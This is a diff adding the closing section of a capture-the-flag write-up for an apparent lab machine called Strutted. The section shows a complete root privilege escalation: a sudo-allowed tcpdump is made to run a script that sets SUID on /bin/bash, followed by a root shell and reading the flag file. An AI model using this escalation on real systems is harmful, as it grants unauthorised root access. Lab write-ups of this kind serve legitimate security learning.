@@ -425,7 +425,37 @@ Once we understand this, let's try to attribute `SUID` privilege to the `/bin/ba
 <br />
 
 ```bash
-
+james@strutted:~$ COMMAND='chmod 4755 /bin/bash'
+james@strutted:~$ TF=$(mktemp)
+james@strutted:~$ echo "$COMMAND" > $TF
+james@strutted:~$ chmod +x $TF
+james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+4 packets received by filter
+0 packets dropped by kernel
 ```
 
 <br />
+
+And when we list the `/bin/bash` privileges.... YES!!
+
+<br />
+
+```bash
+james@strutted:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+james@strutted:~$ bash -p
+bash-5.1# cd /root
+bash-5.1# cat root.txt
+c4fbf2e84eb4486d7c4cea8e76xxxxxx
+```
+
+<br />
+
+Machine Strutted rooted!!
+
+I loved this machine because it has a very interesting intrusion that can get a little complicated.
+
+I hope you enjoyed it as much as I did! Keep hacking!!❤️❤️
